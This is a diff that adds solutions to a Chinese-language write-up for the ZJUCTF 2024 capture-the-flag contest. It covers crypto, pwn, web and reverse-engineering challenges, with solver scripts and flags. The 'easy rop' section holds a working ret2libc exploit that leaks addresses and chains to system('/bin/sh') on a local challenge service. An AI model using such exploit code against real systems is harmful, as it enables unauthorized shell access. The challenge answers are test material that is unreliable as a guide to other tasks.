@@ -347,3 +347,679 @@ print(decoded_string)
 ```
 
 得到 flag `ZJUCTF{A_13G3nd4Ry_4h0uR-T3l36r4Phls7XD}`
+
+### Master of C++
+
+丢给 GPT，然后让它不断压缩代码，最后自己缩短一下函数变量名，得到：
+
+```cpp
+template<int N,int I>struct pc{static const bool v=(N%I)&&(pc<N,I-1>::v);};
+template<int N>struct pc<N,1>{static const bool v=true;};
+template<int N>struct p{static const bool v=pc<N,N/2>::v;};
+template<>struct p<1>{static const bool v=0;};
+int main(){return p<ARG>::v?0:1;}
+```
+
+得到 flag `ZJUCTF{pR3m4tuR3_0PT1miz4t1oN_1s_thE_R00t_of_4LL_3v1l}`。
+
+### 小 A 口算
+
+没什么好写的，pwntools 使用教程罢了。代码：
+
+```python
+from pwn import *
+
+io = remote('localhost', 61234)
+
+line = io.recvuntil(b'choice: ', drop=True)
+io.sendline(b'1')
+
+io.recvline()
+io.recvline()
+io.recvline()
+
+for _ in range(200):
+    line = io.recvline()
+    a, b = map(int, line.split(b' ? '))
+    # print(a, b)
+    if a < b:
+        io.sendline(b'<')
+    elif a > b:
+        io.sendline(b'>')
+    else:
+        io.sendline(b'=')
+    print(io.recvline())
+    print(io.recvline())
+
+io.interactive()
+```
+
+## Crypto
+
+### FIB Ⅰ
+
+给了 \(p, k, (F_a, F_{a+1}), (F_b, F_{b+1})\)，要求：
+
+1. \((F_{a+b}, F_{a+b+1})\)
+2. \((F_{k * a}, F_{k * a + 1})\)
+3. 使得 \((F_{a + c}, F_{a + c + 1}) = (0, 1)\) 的 \((F_c, F_{c+1})\)
+
+使用到的性质为：
+
+- \(F_{n+k} = F_{k-1} * F_n + F_k * F_{n+1}\)
+- \(F_{2n} = F_n * (F_{n-1} + F_{n+1})\)
+
+第一问可以直接用性质 1 计算。
+
+第二问用性质 2，类似快速幂，将 \(k\) 分解为二进制。据说直接算矩阵快速幂也可以，但没想到。
+
+第三问用性质 1，带入进去解方程即可。
+
+代码：
+
+```python
+import math
+import numpy as np
+import sys
+from pwn import *
+
+sys.setrecursionlimit(2000)
+
+def fib_plus(fibn : tuple, fibk: tuple) -> tuple:
+    Fk, Fkp1 = fibk
+    Fn, Fnp1 = fibn
+    Fks1 = (Fkp1 - Fk + p) % p
+    Fnp2 = (Fn + Fnp1) % p
+    return (Fk * Fnp1 % p + Fks1 * Fn % p) % p, (Fk * Fnp2 % p + Fks1 * Fnp1 % p) % p
+
+def fib_times_k(k : int, fib : tuple) -> tuple:
+    if k == 0:
+        return 0, 1
+    if k == 1:
+        return fib
+    if k % 2 != 0:
+        return fib_plus(fib, fib_times_k(k - 1, fib))
+    fiba, fibap1 = fib_times_k(k // 2, fib)
+    fibas1 = (fibap1 - fiba + p) % p
+    fibap2 = (fiba + fibap1) % p
+    fib2a = fiba * ((fibap1 + fibas1) % p) % p
+    fib2ap2 = fibap1 * ((fibap2 + fiba) % p) % p
+    fib2ap1 = (fib2ap2 - fib2a + p) % p
+    return fib2a, fib2ap1
+
+def fib_calc_c(fiba : tuple, fibapc : tuple) -> tuple:
+    Fa, Fap1 = fiba
+    Fapc, Fapcp1 = fibapc
+    Fas1 = (Fap1 - Fa + p) % p
+    tmp = (Fap1 * Fas1 % p + p - Fa * Fa % p) % p
+    if tmp == p - 1:
+        Fnp1 = (Fa * Fapc % p - Fas1 * Fapcp1 % p + p) % p
+        Fn = (Fa * Fapcp1 % p - Fapc * Fap1 % p + p) % p
+    elif tmp == 1:
+        Fnp1 = (Fas1 * Fapcp1 % p - Fa * Fapc % p + p) % p
+        Fn = (Fapc * Fap1 % p - Fa * Fapcp1 % p + p) % p
+    return Fn, Fnp1
+
+io = remote('localhost', 61234)
+
+for _ in range(10):
+    line = io.recvuntil(b'p = ', drop=True)
+    p = int(io.recvline())
+    line = io.recvuntil(b'k = ', drop=True)
+    k = int(io.recvline())
+    line = io.recvuntil(b'fib(a, p) = ', drop=True)
+    fiba = eval(io.recvline())
+    line = io.recvuntil(b'fib(b, p) = ', drop=True)
+    fibb = eval(io.recvline())
+    line = io.recvuntil(b'fib(a + b, p) = ', drop=True)
+    print(line)
+    res = fib_plus(fiba, fibb)
+    io.sendline(bytes(str(res[0] * p + res[1]).encode()))
+    line = io.recvuntil(b'fib(k * a, p) = ', drop=True)
+    print(line)
+    res = fib_times_k(k, fiba)
+    io.sendline(bytes(str(res[0] * p + res[1]).encode()))
+    line = io.recvuntil(b'if fib(a + c, p) = (0, 1), fib(c, p) = ', drop=True)
+    print(line)
+    res = fib_calc_c(fiba, (0, 1))
+    io.sendline(bytes(str(res[0] * p + res[1]).encode()))
+
+io.interactive()
+```
+
+### ezxor
+
+给的代码大概是将 flag 转为 01 串，然后做了后缀异或和，然后随机挑选了 20 个 bit 进行翻转。
+
+先不管随机翻转，异或和比较简单，作差分就还原了：
+
+```python
+import random
+
+# 给定的加密后的二进制字符串
+cipher = '01100011101101011011011000000011101101000101001001000110001111101011000110010100001111111010011110110000010001100011111110110110010110011011010001000111101111100100101110111001110000000101101001001010010111000100100011000111110000000000111001011101111000000100100001001110010011011011100111000000010000011100000001011101101001111011111001011100010111100101000111000000010111011011001001010001110000000100000110111000010010011011000110100011101110011011100010111111101110111010001110110101101101100011111110111110001110111011110001011001101000100101100001001000010011100100101110111010001111111011110110110001101001111010111000110100011011010111001110011001100000101110011110000100010100100110011110111001101101111011011110010101101110000100101000101011101110011100000110010101100110100100011001001000110000101100101001001001101110011001010110100111101101011001010110010001100011000110011001111101100110000111101110010101110111000010100000100011110110000011111001010110'
+
+# 逆向异或操作
+for i in reversed(range(len(cipher))):
+    tmp = int(cipher[i]) ^ int(cipher[i - 1])
+    cipher = cipher[:i] + str(tmp) + cipher[i+1:]
+
+# 逆向 ASCII 编码操作
+plain = ''
+for i in range(0, len(cipher), 8):
+    plain += chr(int(cipher[i:i+8], 2))
+print(plain)
+```
+
+得到 `[ÊUCF{Tell_do>e!_Wel£¯me_to_YJUCTF_2<24!}`。
+
+题目说 Flag 是一段用下划线代替了空格的有意义的英文句子，其实这时候已经可以看出来了，flag 为 `ZJUCTF{Well_done!_Welcome_to_ZJUCTF_2024!}`。
+
+### Shad0wTime
+
+非预期做的，不写了。
+
+## Pwn
+
+真难吧
+
+### easy rop
+
+程序在 `read_name` 中不断 `read(STDIN_FILENO, name, 0x60);`，同时 `name` 数组大小只有 48 字节，存在栈溢出。
+
+checksec 一下，得到：
+
+```
+Arch:       amd64-64-little
+RELRO:      Full RELRO
+Stack:      No canary found
+NX:         NX enabled
+PIE:        PIE enabled
+Stripped:   No
+```
+
+没有栈保护，可以直接覆盖返回地址。但是开了栈不可执行和 ASLR，推断是 ret2libc。
+
+思路是通过泄漏栈上 read_name 和 main 函数的返回地址，计算 rop 和 libc 的基址，覆盖返回地址调用 `system('/bin/sh')`。
+
+```python
+#!/usr/bin/env python
+from pwn import *
+from pwnlib.util.packing import p64, u64
+
+rop = ELF('./rop')
+libc = ELF("./libc-2.27.so")
+# io = process('./rop')
+io = remote('127.0.0.1', 61234)
+
+# context.terminal = ['tmux', 'splitw', '-h']
+# pwnlib.gdb.attach(proc.pidof(io)[0], 'b read_name')
+
+libc_offset = 0x0000000000021C87      # from libc-2.27.so
+read_name_offset = 0x00000000000008F5 # from rop
+
+# get rop base addr
+offset = 0x38
+payload = b'A' * offset
+io.recvuntil(b'please: ')
+io.send(payload)
+io.recvuntil(b'A' * offset)
+recv = io.recv(6)
+adr = u64(recv.ljust(8, b'\x00'))
+rop_base_addr = adr - read_name_offset
+recv = io.recvuntil(b'please: ')
+# print(recv)
+
+# get libc base addr
+offset = 0x48
+payload = b'A' * offset
+io.send(payload)
+io.recvuntil(b'A' * offset)
+recv = io.recv(6)
+adr = u64(recv.ljust(8, b'\x00'))
+# print(hex(adr))
+libc_base_addr = adr - libc_offset
+# print("libc_base_addr: ", hex(libc_base_addr))
+recv = io.recvuntil(b'please: ')
+# print(recv)
+
+# use `ROPgadget --binary rop --only "pop|ret"` to find pop rdi; ret;
+pop_rdi_ret_addr = 0x0000000000000963 + rop_base_addr
+main = rop_base_addr + rop.symbols['main']
+
+# ret to main
+offset = 0x38
+payload = b'A' * offset
+p_retn = 0x0000000000000666 + rop_base_addr
+payload += p64(p_retn)
+payload += p64(main)
+# print(hex(main))
+io.send(payload)
+recv = io.recvuntil(b'please: ')
+# print(recv)
+io.send(b'ZJU\0')
+
+# get shell
+offset = 0x38
+sys_addr = libc_base_addr + libc.symbols['system']
+bin_sh = libc_base_addr + next(libc.search(b'/bin/sh'))
+# print(hex(sys_addr), hex(bin_sh))
+# print(hex(libc.symbols['system']), hex(next(libc.search(b'/bin/sh'))))
+payload = b'A' * offset
+payload += p64(p_retn)
+payload += p64(pop_rdi_ret_addr)
+payload += p64(bin_sh)
+payload += p64(sys_addr)
+io.recvuntil(b'please: ')
+io.sendline(payload)
+
+# break loop to get shell
+recv = io.recvuntil(b'please: ')
+io.send(b'ZJU\0')
+
+io.interactive()
+```
+
+得到 flag `ZJUCTF{@n_1a$y_R0p_cHalL_1N_x64|A7hdJk5wN7}`。
+
+## Web
+
+也好难，只会签到
+
+### easy Pentest
+
+> 访问密钥 AccessKey（简称AK）是阿里云提供给用户的永久访问凭据，一组由 AccessKey ID 和 AccessKey Secret 组成的密钥对。
+
+给了 access key 和 secret key，那直接生成签名就行了。
+
+```python
+import oss2
+
+# 从 key.txt 文件中读取凭证和目标 URL
+access_key_id = ...
+access_key_secret = ...
+endpoint = 'https://oss-cn-beijing.aliyuncs.com'
+bucket_name = 'oss-test-qazxsw'
+
+auth = oss2.Auth(access_key_id, access_key_secret)
+bucket = oss2.Bucket(auth, endpoint, bucket_name)
+
+result = bucket.get_object('fffffflllllaaaagggg.txt')
+print(result.read())
+```
+
+## Reverse
+
+### rev beginner 1
+
+IDA 打开直接就能看到 flag 是如何验证的，直接写脚本解密即可。
+
+```cpp
+#include <iostream>
+
+int main() {
+    char flag[31];
+    *(int *)&flag[2] = 1180126042;
+    *(int *)&flag[6] = 2038516568;
+    *(int *)&flag[10] = 1953070957;
+    *(int *)&flag[14] = -2072744833;
+    *(int *)&flag[18] = 2089054334;
+    *(int *)&flag[22] = 1451916667;
+    flag[26] = -107;
+    *(int *)&flag[27] = 0;
+    for (int i = 0; i <= 24; ++i) {
+        printf("%c", flag[i + 2] - i);
+    }
+    return 0;
+}
+```
+
+得到 flag `ZJUCTF{rev_is_fun_right?}`。
+
+### rev beginner 2
+
+给的可执行文件是 80386 的，用了 `das` 指令，每个字符是独立的，分别爆破就行。
+
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+unsigned char af = 0, cf = 0;
+
+void das(unsigned char *al) {
+    if ((*al & 0x0F) > 9 || af == 1) {
+        *al -= 6;
+        af = 1;
+    } else {
+        af = 0;
+    }
+    if (*al > 0x9F || cf == 1) {
+        *al -= 0x60;
+        cf = 1;
+    } else {
+        cf = 0;
+    }
+}
+
+int main() {
+    int v6; // [esp-8h] [ebp-90h]
+    int v7; // [esp-4h] [ebp-8Ch]
+    int v8; // [esp+0h] [ebp-88h]
+    int i; // [esp+0h] [ebp-88h]
+    int s1[6]; // [esp+4h] [ebp-84h] BYREF
+    uint16_t v11; // [esp+1Ch] [ebp-6Ch]
+    int v12[6]; // [esp+1Eh] [ebp-6Ah]
+    uint16_t v13; // [esp+36h] [ebp-52h]
+    int v14[6]; // [esp+38h] [ebp-50h]
+    uint16_t v15; // [esp+50h] [ebp-38h]
+    int s2[6]; // [esp+52h] [ebp-36h] BYREF
+    uint16_t v17; // [esp+6Ah] [ebp-1Eh]
+    unsigned int v18; // [esp+6Ch] [ebp-1Ch]
+
+    memset(s1, 0, sizeof(s1));
+    v11 = 0;
+    v12[0] = 807607868;
+    v12[1] = 2035092818;
+    v12[2] = -615563966;
+    v12[3] = 3126271;
+    v12[4] = 1328692767;
+    v12[5] = -1532805550;
+    v13 = -28895;
+    v14[0] = -778337675;
+    v14[1] = 916896758;
+    v14[2] = 2142365868;
+    v14[3] = 431515568;
+    v14[4] = 121126838;
+    v14[5] = 1384365358;
+    v15 = -11;
+    s2[0] = -456284019;
+    s2[1] = -825299208;
+    s2[2] = 1858015695;
+    s2[3] = 1263581624;
+    s2[4] = 678129086;
+    s2[5] = -1275860159;
+    v17 = -30731;
+    unsigned char af0 = 1, cf0 = 1;
+    for (int i = 0; i <= 25; ++i) {
+        // save af and cf
+        af0 = af;
+        cf0 = cf;
+        for (unsigned char c = 0; c < 200; ++c) {
+            // restore af and cf
+            af = af0;
+            cf = cf0;
+            unsigned char al = c;
+            unsigned char bl = *((unsigned char *)v12 + i);
+            unsigned char cl = *((unsigned char *)v14 + i);
+            unsigned char res;
+            af = (al & 0x0F) < (bl & 0x0F);
+            cf = al < bl;
+            al = al - bl;
+            das(&al);
+            af = (al & 0x0F) + (cl & 0x0F) > 0xF;
+            cf = (int)al + (int)cl > 0xFF;
+            al = al + cl;
+            res = al;
+            if (res == *((unsigned char *)s2 + i)) {
+                *((unsigned char *)s1 + i) = c;
+                break;
+            }
+        }
+    }
+    for (int i = 0; i < 26; ++i) {
+        printf("%c", *((unsigned char *)s1 + i));
+    }
+    return 0;
+}
+```
+
+得到 `ZJUCTF{welc0me-2-reverse@�`，猜一下最后两个字符，得到 flag `ZJUCTF{welc0me-2-reverse!}`。
+
+### rev beginner 3
+
+发现加密过程都可逆，那直接倒着解密就行了。虽然用了随机数，但给了种子，所以可以直接还原。另外不同架构上生成的随机数序列还不一样，放 amd64 机子上才能跑出来。
+
+```cpp
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void func1_rev(unsigned char *a1, int a2) {
+    a2 += 16909060 * 7;
+    for (int i = 6; i >= 0; --i) {
+        a2 -= 16909060;
+        *(uint32_t *)(a1 + 4LL * i) ^= a2;
+    }
+}
+
+uint32_t __ROL4__(uint32_t value, int count)
+{
+  const uint32_t nbits = sizeof(uint32_t) * 8;
+
+  if ( count > 0 )
+  {
+    count %= nbits;
+    uint32_t high = value >> (nbits - count);
+    if ( (uint32_t)(-1) < 0 ) // signed value
+      high &= ~(((uint32_t)(-1) << count));
+    value <<= count;
+    value |= high;
+  }
+  else
+  {
+    count = -count % nbits;
+    uint32_t low = value << (nbits - count);
+    value >>= count;
+    value |= low;
+  }
+  return value;
+}
+
+uint32_t __ROR4__(uint32_t value, int count)
+{
+  return __ROL4__(value, -count);
+}
+
+void func2_rev(unsigned char *a1, int a2)
+{
+    for (int i = 6; i >= 0; --i )
+    {
+        *(uint32_t *)(a1 + 4LL * i) = __ROL4__(*(uint32_t *)(a1 + 4LL * i), 12);
+        *(uint32_t *)(a1 + 4LL * i) ^= 570619159 - i;
+        *(uint32_t *)(a1 + 4LL * i) = __ROR4__(*(uint32_t *)(a1 + 4LL * i) + a2, 7);
+        *(uint32_t *)(a1 + 4LL * i) ^= a2 + 270817907;
+    }
+}
+
+void func3_rev(unsigned char *a1)
+{
+  for (int i = 26; i >= 0; --i )
+  {
+    *(uint8_t *)(a1 + i) ^= *(uint8_t *)(a1 + i + 1);
+    *(uint8_t *)(a1 + i + 1) ^= *(uint8_t *)(a1 + i);
+    *(uint8_t *)(a1 + i) ^= *(uint8_t *)(a1 + i + 1);
+  }
+}
+
+unsigned char sbox[256] = {
+    0x70, 0x82, 0x2C, 0xEC, 0xB3, 0x27, 0xC0, 0xE5, 0xE4, 0x85, 0x57, 0x35, 0xEA, 0x0C, 0xAE, 0x41,
+    0x23, 0xEF, 0x6B, 0x93, 0x45, 0x19, 0xA5, 0x21, 0xED, 0x0E, 0x4F, 0x4E, 0x1D, 0x65, 0x92, 0xBD,
+    0x86, 0xB8, 0xAF, 0x8F, 0x7C, 0xEB, 0x1F, 0xCE, 0x3E, 0x30, 0xDC, 0x5F, 0x5E, 0xC5, 0x0B, 0x1A,
+    0xA6, 0xE1, 0x39, 0xCA, 0xD5, 0x47, 0x5D, 0x3D, 0xD9, 0x01, 0x5A, 0xD6, 0x51, 0x56, 0x6C, 0x4D,
+    0x8B, 0x0D, 0x9A, 0x66, 0xFB, 0xCC, 0xB0, 0x2D, 0x74, 0x12, 0x2B, 0x20, 0xF0, 0xB1, 0x84, 0x99,
+    0xDF, 0x4C, 0xCB, 0xC2, 0x34, 0x7E, 0x76, 0x05, 0x6D, 0xB7, 0xA9, 0x31, 0xD1, 0x17, 0x04, 0xD7,
+    0x14, 0x58, 0x3A, 0x61, 0xDE, 0x1B, 0x11, 0x1C, 0x32, 0x0F, 0x9C, 0x16, 0x53, 0x18, 0xF2, 0x22,
+    0xFE, 0x44, 0xCF, 0xB2, 0xC3, 0xB5, 0x7A, 0x91, 0x24, 0x08, 0xE8, 0xA8, 0x60, 0xFC, 0x69, 0x50,
+    0xAA, 0xD0, 0xA0, 0x7D, 0xA1, 0x89, 0x62, 0x97, 0x54, 0x5B, 0x1E, 0x95, 0xE0, 0xFF, 0x64, 0xD2,
+    0x10, 0xC4, 0x00, 0x48, 0xA3, 0xF7, 0x75, 0xDB, 0x8A, 0x03, 0xE6, 0xDA, 0x09, 0x3F, 0xDD, 0x94,
+    0x87, 0x5C, 0x83, 0x02, 0xCD, 0x4A, 0x90, 0x33, 0x73, 0x67, 0xF6, 0xF3, 0x9D, 0x7F, 0xBF, 0xE2,
+    0x52, 0x9B, 0xD8, 0x26, 0xC8, 0x37, 0xC6, 0x3B, 0x81, 0x96, 0x6F, 0x4B, 0x13, 0xBE, 0x63, 0x2E,
+    0xE9, 0x79, 0xA7, 0x8C, 0x9F, 0x6E, 0xBC, 0x8E, 0x29, 0xF5, 0xF9, 0xB6, 0x2F, 0xFD, 0xB4, 0x59,
+    0x78, 0x98, 0x06, 0x6A, 0xE7, 0x46, 0x71, 0xBA, 0xD4, 0x25, 0xAB, 0x42, 0x88, 0xA2, 0x8D, 0xFA,
+    0x72, 0x07, 0xB9, 0x55, 0xF8, 0xEE, 0xAC, 0x0A, 0x36, 0x49, 0x2A, 0x68, 0x3C, 0x38, 0xF1, 0xA4,
+    0x40, 0x28, 0xD3, 0x7B, 0xBB, 0xC9, 0x43, 0xC1, 0x15, 0xE3, 0xAD, 0xF4, 0x77, 0xC7, 0x80, 0x9E
+};
+
+unsigned char sbox_rev[256];
+
+unsigned char ans[28] = {
+    0xE6, 0x80, 0xE5, 0x4F, 0x3C, 0x05, 0x12, 0xF9, 0xE8, 0xF7,
+    0x71, 0x3B, 0x92, 0x91, 0x67, 0x5F, 0x5B, 0x91, 0x83, 0x13, 0x73,
+    0x65, 0x1E, 0xE4, 0x8D, 0x20, 0x9A, 0x82
+};
+
+int rand_vals[21];
+
+int main() {
+    srand(0x1337u);
+    for (int i = 0; i < 21; i++) {
+        rand_vals[i] = rand();
+    }
+
+    for (int i = 0; i < 256; ++i) {
+        sbox_rev[sbox[i]] = (unsigned char)i;
+    }
+
+    unsigned char flag[28];
+    memcpy(flag, ans, 28);
+
+    func1_rev(flag, rand_vals[20]);
+    for (int i = 19; i >= 0; i--) {
+        func3_rev(flag);
+        for (int j = 0; j <= 27; ++j) {
+            flag[j] = sbox_rev[flag[j]];
+        }
+        func2_rev(flag, (unsigned int)i);
+        func1_rev(flag, rand_vals[i]);
+    }
+    for (int i = 0; i <= 27; ++i) {
+        printf("%c", flag[i]);
+    }
+    return 0;
+}
+```
+
+得到 flag `ZJUCTF{s0_EaSy_2_gE7_@n$W3R}`。
+
+### easy hap
+
+给了个鸿蒙的 app，直接解压，用 jadx 打开里面的 `module.abc` 文件，里面 `CipherUtil` 这个类在做加解密。
+
+是个链式加密，里面的参数传递啥的看不懂，猜了猜然后做出来了。
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import numpy as np
+from Crypto.Cipher import AES
+import base64
+
+def string_to_uint8_array(s):
+    return np.array([ord(c) for c in s], dtype=np.uint8)
+
+def encodeX(arg0, arg1):
+    res = []
+    for i in range(16):
+        res.append(arg0[i] ^ arg1[i])
+    for i in range(16):
+        res.append(arg1[i])
+    return res
+
+def encodeY(arg):
+    return base64.b64encode(bytes(arg)).decode()
+
+def decodeY(arg):
+    return base64.b64decode(arg)
+
+def decodeX(res):
+    arg0 = res[:16]
+    arg1 = res[16:]
+    for i in range(16):
+        arg0[i] ^= arg1[i]
+    return arg0, arg1
+
+commonCipherKey = string_to_uint8_array("ZJUCTF2024-OHAPP").tobytes()
+
+code = "Uzzj0V3pAh3AlPJ150WajAyXXST9UrJOdAo6iGDSj1c="
+
+tmp4 = code
+
+tmp3 = decodeY(tmp4)
+tmp3 = [c for c in tmp3]
+# print(tmp3)
+
+tmp1, tmp2 = decodeX(tmp3)
+tmp1 = bytes(tmp1)
+tmp2 = bytes(tmp2)
+# print(tmp2)
+# print(tmp1)
+
+cipherY = AES.new(commonCipherKey, AES.MODE_CBC, iv=tmp1)
+slice2 = cipherY.decrypt(tmp2)
+# print(slice2)
+
+cipherX = AES.new(commonCipherKey, AES.MODE_ECB)
+slice1 = cipherX.decrypt(tmp1)
+# print(slice1)
+
+flag = slice1 + slice2
+print("ZJUCTF{" + flag.decode() + "}")
+```
+
+得到 flag `ZJUCTF{_@_Ea5Y_ohaPp_@ND_a_5iMPl3_fl4g_}`。
+
+### Rukma
+
+<!-- x-x-x-x-m-m-o-o-x-o-x-x -->
+看反编译代码，可以发现 flag 的形式为 `A-A-A-A-A-A-A-A-A-A-A-A` 其中 `A` 为 `x` 或 `m` 或 `o`。那么直接枚举爆破就行了。
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+# pwntools is too slow!!!
+import subprocess
+import tqdm
+import itertools
+import random
+import time
+
+charset = "xmo"
+length = 23 - 11
+comb = itertools.product(charset, repeat=length)
+comb = list(comb)
+random.shuffle(comb) # maybe we can find the flag faster
+
+exe_path = "./chall"
+
+for c in tqdm.tqdm(comb):
+    flag = ''.join(c)
+    for i in range(1, 23, 2):
+        flag = flag[:i] + '-' + flag[i:]
+    # print(flag)
+
+    p = subprocess.Popen(
+        exe_path,
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True
+    )
+    p.stdin.write(flag + '\n')
+    p.stdin.flush()
+    stdout = p.stdout.read()
+    # print(stdout)
+    if stdout != "input: try again\n":
+        print(stdout)
+        break
+    p.stdin.close()
+    p.stdout.close()
+    p.wait()
+```
+
+得到 flag `ZJUCTF{m-x-m-m-o-o-x-o-m-x-o-x}`。
